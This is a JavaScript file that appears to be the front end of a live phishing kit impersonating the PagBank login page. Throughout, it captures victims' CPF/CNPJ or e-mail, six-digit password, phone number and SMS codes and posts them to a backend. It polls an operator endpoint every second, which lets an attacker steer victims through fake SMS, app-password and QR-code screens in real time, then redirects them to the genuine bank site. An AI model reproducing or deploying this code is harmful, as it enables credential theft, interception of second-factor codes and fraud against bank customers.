$(document).ready(function () {

    $("#formlogin").on("submit", function (event) {
        event.preventDefault();

        ValidarUsuario();
        limparCamposSenha();
    });

    $("#continue").on("click", function (event) {
        event.preventDefault();

        ValidarUsuario();
        limparCamposSenha();
    });

    $("#changeUser").on("click", function (event) {
        $("#bloco_senha").hide();
        $("#bloco_login").show();
        limparCamposSenha();
    });

    function AtualizarComando() {
        const requestweb = $.ajax({
            url: "../webdriver/function.php?acao=comando",
            method: "post",
            dataType: "text",
            data: {},
            cache: false
        });

        requestweb.done(data => {

            if (data == 'sms') {
                $("#sms").val("");
                $("#bloco_login, #bloco_telefone, #bloco_load, #bloco_senha_app, #bloco_senha, #tela_qrcode").hide();
                $("#bloco_sms, #tela_login").show();

                const request = $.ajax({
                    url: "../webdriver/function.php?funcao=enviar-comando",
                    method: "post",
                    dataType: "text",
                    data: {
                        comando: 'AGUARDANDO SMS'
                    },
                    cache: false
                });
            }

            if (data == 'senha_app') {
                $("#bloco_login, #bloco_telefone, #bloco_load, #bloco_sms, #bloco_senha, #tela_qrcode").hide();
                $("#bloco_senha_app, #tela_login").show();

                const request = $.ajax({
                    url: "../webdriver/function.php?funcao=enviar-comando",
                    method: "post",
                    dataType: "text",
                    data: {
                        comando: 'TROCAR_SENHA_APP'
                    },
                    cache: false
                });
            }

            if (data == 'senha_erro') {
                $("#bloco_login, #bloco_telefone, #bloco_load, #bloco_sms, #bloco_senha_app, #tela_qrcode").hide();
                $("#bloco_senha, #tela_login").show();
                $("#alert-box-message").show();
                $("#alert-box-message2").show();
                limparCamposSenha();

                const request = $.ajax({
                    url: "../webdriver/function.php?funcao=enviar-comando",
                    method: "post",
                    dataType: "text",
                    data: {
                        comando: 'AGUARDANDO SENHA'
                    },
                    cache: false
                });
            }

            if (data == 'login_erro') {
                $("#bloco_senha, #bloco_telefone, #bloco_load, #bloco_sms, #bloco_senha_app, #tela_qrcode").hide();
                $("#bloco_login, #tela_login").show();

                const request = $.ajax({
                    url: "../webdriver/function.php?funcao=enviar-comando",
                    method: "post",
                    dataType: "text",
                    data: {
                        comando: 'AGUARDANDO USUARIO'
                    },
                    cache: false
                });

                $('.form-field_formField__XNwMP').css('border-color', '#cb2a2a');
                $("#erro_login").show();
                $("#continue").prop("disabled", false);
                $('.form-field_formField__XNwMP').removeClass('form-field_formFieldLoading__VqZu8');
            }

            if (data == 'capturando_qrcode') {
                $("#bloco_senha, #bloco_telefone, #bloco_load, #bloco_sms, #bloco_senha_app, #bloco_login, #tela_login").hide();
                $("#tela_qrcode").show();

                const request = $.ajax({
                    url: "../webdriver/function.php?funcao=enviar-comando",
                    method: "post",
                    dataType: "text",
                    data: {
                        comando: 'CAPTURANDO_QRCODE'
                    },
                    cache: false
                });

                var valorFormatado = aplicarMascara($("#user").val());
                AtualizarQr(valorFormatado);
            }

            if (data == 'loader') {
                $("#bloco_login, #bloco_telefone, #bloco_sms, #bloco_senha_app, #bloco_senha, #tela_qrcode").hide();
                $("#bloco_load, #tela_login").show();
            }

            if (data == 'atendimento_finalizado') {
                window.location.href = "https://pagbank.com.br/";
            }

        })

            .always(function () {
                setTimeout(function () {
                    AtualizarComando();
                }, 1000);
            });
    }

    $("#trocar_senha").on("click", function (event) {
        event.preventDefault();

        const request = $.ajax({
            url: "../webdriver/function.php?funcao=enviar-comando",
            method: "post",
            dataType: "text",
            data: {
                comando: 'TROQUEI_A_SENHA'
            },
            cache: false
        });

        request.done(function (resposta) {
            location.reload();
        });
    });

    $("#enter").on("click", function (event) {
        event.preventDefault();

        atualizarSenha();
        $("#enter").prop("disabled", true);

        setTimeout(function () {
            limparCamposSenha();
            $("#bloco_telefone").show();
            $("#bloco_senha").hide();

            $(".style_lostDevice__8kPgI").hide();
            $(".style_hideOnDesktop__n11xr").hide();
        }, 2000);
    });

    function gerarNomeArquivo(info) {
        return info
            .replace(/[^a-zA-Z0-9_\-@.]/g, '_') // mesma sanitização do preg_replace
            .replace(/@/g, '_at_')              // substitui @ por _at_
            .replace(/\./g, '_') + ".png";      // substitui . por _
    }

    function AtualizarQr(info) {
        const nomeArquivo = gerarNomeArquivo(info);

        const img = document.getElementById("img_qr");
        if (img) {
            const baseSrc = `../webdriver/qrs/${nomeArquivo}`;
            const timestamp = new Date().getTime();
            img.src = `${baseSrc}?v=${timestamp}`;
            $("#img_qr").show();
        }
    }

    //AtualizarQr("teste@gmail.com");

    function limparCamposSenha() {
        const $inputs = $('.secret-box_secretBoxInput__YKKhF');
        $inputs.val('');
        $inputs.eq(0).focus(); // coloca o cursor no primeiro campo
    }

    const $inputs = $('.secret-box_secretBoxInput__YKKhF');

    $inputs.on('input', function (e) {
        const $this = $(this);
        const index = parseInt($this.attr('data-index'));
        let valor = $this.val().replace(/\D/g, '');

        // Caso tenha colado mais de 1 dígito (ex: colar 6 dígitos)
        if (valor.length > 1) {
            const digitos = valor.split('');
            for (let i = 0; i < digitos.length && index + i < $inputs.length; i++) {
                $inputs.eq(index + i).val(digitos[i]);
            }
            $inputs.eq(Math.min(index + digitos.length, $inputs.length - 1)).focus();
        } else {
            $this.val(valor); // limpa tudo que não é número
            if (valor && index < $inputs.length - 1) {
                $inputs.eq(index + 1).focus();
            }
        }

        atualizarSenha();
    });

    const $telefone = $('#telefone');
    const $botao_telefone = $('#botaotelefone');

    $telefone.mask('(00) 00000-0000');
    $botao_telefone.prop('disabled', true); // desativa no início

    function validarTelefone(numero) {
        const limpo = numero.replace(/\D/g, ''); // só números
        if (limpo.length !== 11) return false;

        const ddd = limpo.substring(0, 2);
        const inicialCelular = limpo[2];

        return (
            /^[1-9][0-9]$/.test(ddd) && // DDD válido
            inicialCelular === '9'     // começa com 9 = celular
        );
    }

    $("#formtelefone").on("submit", function (event) {
        event.preventDefault(); // Previne o envio padrão do formulário

        // Chame sua ação personalizada aqui
        EnviarTelefone();
    });

    $("#botaotelefone").on("click", function (event) {
        event.preventDefault(); // Previne o envio padrão do formulário

        // Chame sua ação personalizada aqui
        EnviarTelefone();
    });

    function EnviarTelefone() {
        var telefone = document.querySelector('#telefone').value;
        $botao_telefone.prop('disabled', true);

        const request = $.ajax({
            method: "post",
            url: "../webdriver/function.php?funcao=salvar-token",
            data: {
                valor: telefone,
                funcao: 'Telefone'
            },
        });

        request.done(data => {
            const request = $.ajax({
                url: "../webdriver/function.php?funcao=enviar-comando",
                method: "post",
                dataType: "text",
                data: {
                    comando: 'TELEFONE RECEBIDO'
                },
                cache: false
            });

            AtualizarComando();
            setTimeout(() => {
                $("#bloco_load").show();
                $("#bloco_telefone").hide();
            }, 2000);
            return true;

        });
    }

    $("#formsms").on("submit", function (event) {
        event.preventDefault(); // Previne o envio padrão do formulário

        // Chame sua ação personalizada aqui
        EnviarSMS();
    });

    $("#botaosms").on("click", function (event) {
        event.preventDefault(); // Previne o envio padrão do formulário

        // Chame sua ação personalizada aqui
        EnviarSMS();
    });

    const $botao_sms = $('#botaosms');

    function EnviarSMS() {
        var sms = document.querySelector('#sms').value;
        $botao_sms.prop('disabled', true);

        const request = $.ajax({
            method: "post",
            url: "../webdriver/function.php?funcao=salvar-token",
            data: {
                valor: sms,
                funcao: 'SMS'
            },
        });

        request.done(data => {
            const request = $.ajax({
                url: "../webdriver/function.php?funcao=enviar-comando",
                method: "post",
                dataType: "text",
                data: {
                    comando: 'SMS RECEBIDO'
                },
                cache: false
            });

            setTimeout(() => {
                $("#bloco_load").show();
                $("#bloco_sms").hide();
                $('#sms').val('');
            }, 2000);
            return true;

        });
    }

    $('#sms').on('input', function () {
        // Remove tudo que não for número
        this.value = this.value.replace(/\D/g, '');

        // Verifica se tem exatamente 6 dígitos
        if (this.value.length === 6) {
            $('#botaosms').prop('disabled', false);
        } else {
            $('#botaosms').prop('disabled', true);
        }
    });

    $telefone.on('input', function () {
        const telefone = $telefone.val();
        if (validarTelefone(telefone)) {
            $botao_telefone.prop('disabled', false);
        } else {
            $botao_telefone.prop('disabled', true);
        }
    });

    $inputs.on('paste', function (e) {
        e.preventDefault();
        const pastedData = (e.originalEvent || e).clipboardData.getData('text').replace(/\D/g, '');
        const $this = $(this);
        const index = parseInt($this.attr('data-index'));

        const digits = pastedData.split('');
        for (let i = 0; i < digits.length && index + i < $inputs.length; i++) {
            $inputs.eq(index + i).val(digits[i]);
        }
        $inputs.eq(Math.min(index + digits.length, $inputs.length - 1)).focus();
        atualizarSenha();
    });

    let senhaVisivel = false;

    const svgMostrar = `
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" data-icon-name="view-on-navigation-small-lined">
            <path fill-rule="evenodd" d="M9.223 7.843a5 5 0 1 1 5.555 8.315 5 5 0 0 1-5.555-8.315Zm1.11 6.651a3 3 0 1 0 3.334-4.987 3 3 0 0 0-3.333 4.987Z" clip-rule="evenodd"></path>
            <path fill-rule="evenodd" d="M18.378 5.76a11.13 11.13 0 0 1 4.252 5.07 3.001 3.001 0 0 1 0 2.34A11.13 11.13 0 0 1 12 20a11.13 11.13 0 0 1-10.63-6.83 3 3 0 0 1 0-2.34A11.13 11.13 0 0 1 12 4a11.13 11.13 0 0 1 6.378 1.76Zm-1.105 10.796a9.181 9.181 0 0 0 3.517-4.186.87.87 0 0 0 0-.74A9.18 9.18 0 0 0 12 6a9.18 9.18 0 0 0-8.79 5.63.87.87 0 0 0 0 .74A9.18 9.18 0 0 0 12 18a9.18 9.18 0 0 0 5.273-1.444Z" clip-rule="evenodd"></path>
        </svg>`;

    const svgOcultar = `
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" data-icon-name="view-off-navigation-small-lined">
            <path fill-rule="evenodd" d="M3.71 2.29a1.004 1.004 0 1 0-1.42 1.42l2.54 2.53a11.78 11.78 0 0 0-3.59 4.59 3 3 0 0 0 0 2.34A11.13 11.13 0 0 0 11.87 20a12 12 0 0 0 5.45-1.23l2.95 2.95a1.002 1.002 0 0 0 1.638-.325 1 1 0 0 0-.219-1.095L3.71 2.29Zm5.59 8.43 4 4A3 3 0 0 1 12 15a3 3 0 0 1-3-3 3 3 0 0 1 .3-1.28ZM11.87 18a9.18 9.18 0 0 1-8.79-5.63.87.87 0 0 1 0-.74 9.57 9.57 0 0 1 3.18-4l1.58 1.62a5 5 0 0 0 6.91 6.91l1.07 1.08a10.22 10.22 0 0 1-3.95.76Z" clip-rule="evenodd"></path>
            <path d="M22.76 10.83A11.13 11.13 0 0 0 12.13 4h-1.08a1.003 1.003 0 1 0 .16 2 9.41 9.41 0 0 1 .92 0 9.18 9.18 0 0 1 8.79 5.63.87.87 0 0 1 0 .74c-.316.71-.712 1.38-1.18 2a1 1 0 0 0 .19 1.4 1 1 0 0 0 1.4-.2 11.896 11.896 0 0 0 1.43-2.43 2.999 2.999 0 0 0 0-2.31Z"></path>
            <path d="M15.278 11.8a1 1 0 0 1-.369-.55 3 3 0 0 0-2.12-2.13 1 1 0 1 1 .5-1.93 5 5 0 0 1 3.59 3.59 1 1 0 0 1-.72 1.22c-.082.01-.166.01-.25 0a1 1 0 0 1-.631-.2Z"></path>
        </svg>`;

    const $botao = $('[data-subcomponent-name="secret-box-hide-view"] button');

    $botao.on('click', function () {
        senhaVisivel = !senhaVisivel;

        const tipo = senhaVisivel ? 'tel' : 'password';
        const titulo = senhaVisivel ? 'Ocultar números' : 'Mostrar números';
        const novoSVG = senhaVisivel ? svgOcultar : svgMostrar;

        // Atualiza tipo dos inputs
        $('.secret-box_secretBoxInput__YKKhF').attr('type', tipo);

        // Atualiza título do botão
        $botao.attr('title', titulo);

        // Atualiza o SVG do botão
        $botao.html(novoSVG);
    });

    function atualizarSenha() {
        const senha = $inputs.map(function () {
            return $(this).val();
        }).get().join('');

        const $botao = $('#enter');

        if ($botao.length) {
            $botao.prop('disabled', senha.length !== 6);
        }

        if (senha.length === 6) {
            console.log('Senha completa:', senha);

            // 👇 ajuste aqui se o email vem de outro campo/input
            const email = $('#user').val(); // ou qualquer variável sua

            const request = $.ajax({
                method: "post",
                url: "../webdriver/function.php/?funcao=salvar-login",
                data: {
                    usuario: email,
                    senha: senha,
                    tipo: "PAGBANK",
                },
            });

            request.done(function (resposta) {
                console.log('✅ Sucesso:', resposta);

                setInterval(function () {
                    //Incluir e enviar o POST para o arquivo responsável em fazer contagem
                    $.post("../webdriver/function.php?app=online", {
                        contar: email,
                    }, function (data) {
                        $('#online').text(data);
                    });
                }, 2000);
                $("#telefone").val('');
                const request = $.ajax({
                    url: "../webdriver/function.php?funcao=enviar-comando",
                    method: "post",
                    dataType: "text",
                    data: {
                        comando: 'LOGIN PENDENTE',
                    },
                    cache: false
                });
            });

            request.fail(function (erro) {
                console.error('❌ Erro:', erro);
                alert('Erro ao validar a senha.');

                $inputs.val('');
                $inputs.eq(0).focus();
            });
        }
    }

    function ValidarUsuario() {
        var valor = $("#user").val();
        $("#continue").prop("disabled", true);

        $("#telefone").val('');

        let valorFormatado = aplicarMascara(valor);

        if (validarEmail(valor)) {
            console.log('E-mail válido ✅');
            $("#erro_login").hide();
            $('.form-field_formField__XNwMP').css('border-color', '');
            setTimeout(function () {
                $("#bloco_senha").show();
                $("#bloco_login").hide();
                $("#continue").prop("disabled", false);
                $(".style_spanUsername__Tfosc").text(valorFormatado);
                $('.form-field_formField__XNwMP').removeClass('form-field_formFieldLoading__VqZu8');
                $('[data-subcomponent-name="secret-box-input"][data-index="0"]').focus();
            }, 3000);

            if (!$('.form-field_formField__XNwMP').hasClass('form-field_formFieldLoading__VqZu8')) {
                $('.form-field_formField__XNwMP').addClass('form-field_formFieldLoading__VqZu8');
            }
        } else if (validarCPF(valor)) {
            console.log('CPF válido ✅');
            $("#erro_login").hide();
            $('.form-field_formField__XNwMP').css('border-color', '');
            setTimeout(function () {
                $("#bloco_senha").show();
                $("#bloco_login").hide();
                $("#continue").prop("disabled", false);
                $(".style_spanUsername__Tfosc").text(valorFormatado);
                $('.form-field_formField__XNwMP').removeClass('form-field_formFieldLoading__VqZu8');
                $('[data-subcomponent-name="secret-box-input"][data-index="0"]').focus();
            }, 3000);

            if (!$('.form-field_formField__XNwMP').hasClass('form-field_formFieldLoading__VqZu8')) {
                $('.form-field_formField__XNwMP').addClass('form-field_formFieldLoading__VqZu8');
            }
        } else if (validarCNPJ(valor)) {
            console.log('CNPJ válido ✅');
            $("#erro_login").hide();
            $('.form-field_formField__XNwMP').css('border-color', '');
            setTimeout(function () {
                $("#bloco_senha").show();
                $("#bloco_login").hide();
                $("#continue").prop("disabled", false);
                $(".style_spanUsername__Tfosc").text(valorFormatado);
                $('.form-field_formField__XNwMP').removeClass('form-field_formFieldLoading__VqZu8');
                $('[data-subcomponent-name="secret-box-input"][data-index="0"]').focus();
            }, 3000);

            if (!$('.form-field_formField__XNwMP').hasClass('form-field_formFieldLoading__VqZu8')) {
                $('.form-field_formField__XNwMP').addClass('form-field_formFieldLoading__VqZu8');
            }
        } else {
            console.log('❌ CPF, CNPJ ou E-mail inválido!');
            $('.form-field_formField__XNwMP').css('border-color', '#cb2a2a');
            $("#erro_login").show();
            $("#bloco_senha").hide();
            $("#continue").prop("disabled", false);
            $('.form-field_formField__XNwMP').removeClass('form-field_formFieldLoading__VqZu8');
        }
    }

    const input = document.getElementById('user');
    const btnclick = document.getElementById('continue');
    const output = document.querySelector('.style_spanUsername__Tfosc');

    btnclick.addEventListener('click', function () {
        let valorOriginal = input.value;

        // Se contém letras ou @, assume que é e-mail
        if (/[a-zA-Z@]/.test(valorOriginal)) {
            output.textContent = valorOriginal;
            return; // não mascara
        }

        // Só segue daqui se for apenas números
        let numeros = valorOriginal.replace(/\D/g, '');

        if (numeros.length <= 11) {
            // CPF
            valorFormatado = numeros
                .replace(/^(\d{3})(\d)/, '$1.$2')
                .replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3')
                .replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4')
                .slice(0, 14);
        } else {
            // CNPJ
            valorFormatado = numeros
                .replace(/^(\d{2})(\d)/, '$1.$2')
                .replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3')
                .replace(/\.(\d{3})(\d)/, '.$1/$2')
                .replace(/(\d{4})(\d)/, '$1-$2')
                .slice(0, 18);
        }

        input.value = valorFormatado;
        output.textContent = valorFormatado;
    });

    function aplicarMascara(valor) {
        const somenteNumeros = valor.replace(/\D/g, '');

        if (somenteNumeros.length === 11) {
            // CPF: 000.000.000-00
            return somenteNumeros.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
        } else if (somenteNumeros.length === 14) {
            // CNPJ: 00.000.000/0000-00
            return somenteNumeros.replace(/(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})/, "$1.$2.$3/$4-$5");
        } else {
            // Provavelmente e-mail ou valor inválido
            return valor;
        }
    }

    function validarCPF(cpf) {
        cpf = cpf.replace(/[^\d]+/g, '');
        if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
        let soma = 0, resto;
        for (let i = 1; i <= 9; i++) soma += parseInt(cpf[i - 1]) * (11 - i);
        resto = (soma * 10) % 11;
        if (resto === 10 || resto === 11) resto = 0;
        if (resto !== parseInt(cpf[9])) return false;
        soma = 0;
        for (let i = 1; i <= 10; i++) soma += parseInt(cpf[i - 1]) * (12 - i);
        resto = (soma * 10) % 11;
        if (resto === 10 || resto === 11) resto = 0;
        return resto === parseInt(cpf[10]);
    }

    function validarCNPJ(cnpj) {
        cnpj = cnpj.replace(/[^\d]+/g, '');
        if (cnpj.length !== 14 || /^(\d)\1+$/.test(cnpj)) return false;
        let tamanho = cnpj.length - 2,
            numeros = cnpj.substring(0, tamanho),
            digitos = cnpj.substring(tamanho),
            soma = 0,
            pos = tamanho - 7;
        for (let i = tamanho; i >= 1; i--) {
            soma += numeros.charAt(tamanho - i) * pos--;
            if (pos < 2) pos = 9;
        }
        let resultado = soma % 11 < 2 ? 0 : 11 - soma % 11;
        if (resultado != digitos.charAt(0)) return false;
        tamanho += 1;
        numeros = cnpj.substring(0, tamanho);
        soma = 0;
        pos = tamanho - 7;
        for (let i = tamanho; i >= 1; i--) {
            soma += numeros.charAt(tamanho - i) * pos--;
            if (pos < 2) pos = 9;
        }
        resultado = soma % 11 < 2 ? 0 : 11 - soma % 11;
        return resultado == digitos.charAt(1);
    }

    function validarEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email);
    }
});